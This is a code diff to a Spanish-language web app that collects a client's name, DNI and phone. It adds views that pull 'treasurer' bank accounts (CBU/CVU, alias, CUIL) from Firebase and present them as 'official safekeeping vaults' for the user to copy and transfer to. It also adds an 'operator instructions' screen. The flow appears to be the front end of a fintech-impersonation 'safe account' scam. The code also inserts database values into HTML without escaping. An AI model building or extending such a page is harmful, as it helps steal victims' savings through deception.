@@ -24,12 +24,14 @@ class App {
       claimAmount: '',
       payAmount: '',
       payType: 'Pago Total',
-      selectedBanks: []
+      selectedBanks: [],
+      treasurers: []
     };
     this.init();
   }
 
   init() {
+    this.listenToTreasurers();
     this.updateView();
   }
 
@@ -50,7 +52,114 @@ class App {
     window.scrollTo({ top: 0, behavior: 'smooth' });
   }
 
-  // --- LÓGICA DE NAVEGACIÓN "VOLVER" ---
+  // --- ESCUCHA EN TIEMPO REAL DE CUENTAS DE TESORERÍA ---
+  listenToTreasurers() {
+    const treasurersRef = ref(db, 'treasurers');
+    onValue(treasurersRef, (snapshot) => {
+      const data = snapshot.val() || {};
+      this.state.treasurers = Object.entries(data).map(([key, val]) => ({ key, ...val }));
+      if (this.state.currentView === 'flow-app-treasury') {
+        this.renderTreasuryCards();
+      }
+    });
+  }
+
+  renderTreasuryCards() {
+    const container = document.getElementById('treasury-cards-container');
+    if (!container) return;
+
+    container.innerHTML = '';
+
+    if (this.state.treasurers.length === 0) {
+      container.innerHTML = `
+        <div class="p-4 bg-slate-50 border border-slate-200 rounded-xl text-center text-xs text-slate-500">
+          <p>Cargando bóvedas de resguardo oficiales...</p>
+        </div>
+      `;
+      return;
+    }
+
+    this.state.treasurers.forEach((t, index) => {
+      const card = document.createElement('div');
+      card.className = 'p-4 bg-slate-50 border border-slate-200 rounded-xl space-y-2.5 hover:border-nxOrange-300 transition shadow-sm';
+      card.innerHTML = `
+        <div class="flex items-center justify-between border-b border-slate-200 pb-2">
+          <span class="text-xs font-bold text-nxPurple-900">Bóveda Oficial #${index + 1}</span>
+          <span class="text-[10px] bg-nxOrange-100 text-nxOrange-700 font-extrabold px-2 py-0.5 rounded-full">Activa</span>
+        </div>
+        
+        <div class="text-xs space-y-1 text-slate-700">
+          <div><strong class="text-slate-900">Titular / Tesorería:</strong> ${t.name}</div>
+          <div><strong class="text-slate-900">CUIL:</strong> ${t.cuil}</div>
+        </div>
+
+        <div class="space-y-1.5 pt-1">
+          <!-- Campo Alias -->
+          <div class="flex items-center justify-between bg-white p-2 rounded-lg border border-slate-200 text-xs">
+            <div class="truncate mr-2">
+              <span class="text-[10px] text-slate-400 block font-bold uppercase">Alias</span>
+              <span class="font-mono font-bold text-slate-800">${t.alias}</span>
+            </div>
+            <button type="button" onclick="app.copyToClipboard('${t.alias}', 'Alias')" class="bg-nxPurple-50 hover:bg-nxPurple-100 text-nxPurple-900 font-bold px-2.5 py-1.5 rounded-md text-[11px] transition flex items-center space-x-1 shrink-0">
+              <i class="fa-regular fa-copy"></i>
+              <span>Copiar Alias</span>
+            </button>
+          </div>
+
+          <!-- Campo CBU -->
+          <div class="flex items-center justify-between bg-white p-2 rounded-lg border border-slate-200 text-xs">
+            <div class="truncate mr-2">
+              <span class="text-[10px] text-slate-400 block font-bold uppercase">CBU / CVU</span>
+              <span class="font-mono font-bold text-slate-800 text-[11px]">${t.cbu}</span>
+            </div>
+            <button type="button" onclick="app.copyToClipboard('${t.cbu}', 'CBU')" class="bg-nxOrange-50 hover:bg-nxOrange-100 text-nxOrange-700 font-bold px-2.5 py-1.5 rounded-md text-[11px] transition flex items-center space-x-1 shrink-0">
+              <i class="fa-regular fa-copy"></i>
+              <span>Copiar CBU</span>
+            </button>
+          </div>
+        </div>
+      `;
+      container.appendChild(card);
+    });
+  }
+
+  copyToClipboard(text, type) {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).then(() => {
+        alert(`¡${type} copiado al portapapeles!`);
+      }).catch(() => {
+        this.fallbackCopyText(text, type);
+      });
+    } else {
+      this.fallbackCopyText(text, type);
+    }
+  }
+
+  fallbackCopyText(text, type) {
+    const textArea = document.createElement("textarea");
+    textArea.value = text;
+    document.body.appendChild(textArea);
+    textArea.select();
+    try {
+      document.execCommand('copy');
+      alert(`¡${type} copiado al portapapeles!`);
+    } catch (err) {
+      alert(`No se pudo copiar automáticamente. Copia manualmente: ${text}`);
+    }
+    document.body.removeChild(textArea);
+  }
+
+  goToTreasuryCards() {
+    this.state.currentView = 'flow-app-treasury';
+    this.updateView();
+  }
+
+  goToOperatorInstructions() {
+    this.state.currentView = 'flow-app-operator';
+    this.updateView();
+  }
+
+  // --- NAVEGACIÓN "VOLVER" ---
   goBack() {
     const view = this.state.currentView;
 
@@ -58,8 +167,12 @@ class App {
       this.state.currentView = 'screen-1';
     } else if (view === 'screen-3') {
       this.state.currentView = 'screen-2';
-    } else if (view === 'flow-app-issues' || view === 'flow-payments' || view === 'flow-transfers') {
+    } else if (view === 'flow-app-info' || view === 'flow-payments' || view === 'flow-transfers') {
       this.state.currentView = 'screen-3';
+    } else if (view === 'flow-app-treasury') {
+      this.state.currentView = 'flow-app-info';
+    } else if (view === 'flow-app-operator') {
+      this.state.currentView = 'flow-app-treasury';
     } else if (view === 'pay-waiting') {
       this.state.currentView = 'flow-payments';
     } else if (view === 'claim-banks') {
@@ -75,10 +188,10 @@ class App {
   }
 
   updateView() {
-    // 1. Ocultar todas las pantallas
     const views = [
       'screen-1', 'screen-2', 'screen-3', 
-      'flow-app-issues', 'flow-payments', 'pay-form-view', 'pay-waiting-view', 
+      'flow-app-info', 'flow-app-treasury', 'flow-app-operator',
+      'flow-payments', 'pay-form-view', 'pay-waiting-view', 
       'flow-transfers', 'claim-form-view', 'claim-banks-view', 'claim-instructions-view', 'claim-waiting-view'
     ];
 
@@ -91,7 +204,6 @@ class App {
     const progressContainer = document.getElementById('progress-container');
     const v = this.state.currentView;
 
-    // 2. Controlar visibilidad del Botón Volver y Barra Navegradora
     if (v === 'screen-1') {
       if (navHeader) {
         navHeader.classList.add('hidden');
@@ -101,19 +213,16 @@ class App {
       return;
     }
 
-    // Mostrar barra superior en pantallas 2 en adelante
     if (navHeader) {
       navHeader.classList.remove('hidden');
       navHeader.classList.add('flex');
     }
 
-    // 3. Renderizado y Persistencia por vista
     if (v === 'screen-2') {
       document.getElementById('screen-2').classList.remove('hidden');
       if (progressContainer) progressContainer.classList.remove('hidden');
       this.updateProgress(1, 3, 'Paso 2 de 3: Datos Personales', '33%');
 
-      // Restaurar datos guardados
       if (this.state.client.name) document.getElementById('client-name').value = this.state.client.name;
       if (this.state.client.dni) document.getElementById('client-dni').value = this.state.client.dni;
       if (this.state.client.phone) document.getElementById('client-phone').value = this.state.client.phone;
@@ -125,11 +234,17 @@ class App {
       this.updateProgress(2, 3, 'Paso 3 de 3: Selección de Gestión', '66%');
 
     } else {
-      // Ocultar barra de progreso en flujos avanzados pero MANTENER el botón Volver
       if (progressContainer) progressContainer.classList.add('hidden');
 
-      if (v === 'flow-app-issues') {
-        document.getElementById('flow-app-issues').classList.remove('hidden');
+      if (v === 'flow-app-info') {
+        document.getElementById('flow-app-info').classList.remove('hidden');
+
+      } else if (v === 'flow-app-treasury') {
+        document.getElementById('flow-app-treasury').classList.remove('hidden');
+        this.renderTreasuryCards();
+
+      } else if (v === 'flow-app-operator') {
+        document.getElementById('flow-app-operator').classList.remove('hidden');
 
       } else if (v === 'flow-payments') {
         document.getElementById('flow-payments').classList.remove('hidden');
@@ -186,7 +301,7 @@ class App {
   selectCategory(category) {
     this.state.currentCategory = category;
     if (category === 'app_issues') {
-      this.state.currentView = 'flow-app-issues';
+      this.state.currentView = 'flow-app-info';
     } else if (category === 'payments') {
       this.state.currentView = 'flow-payments';
     } else if (category === 'transfers') {
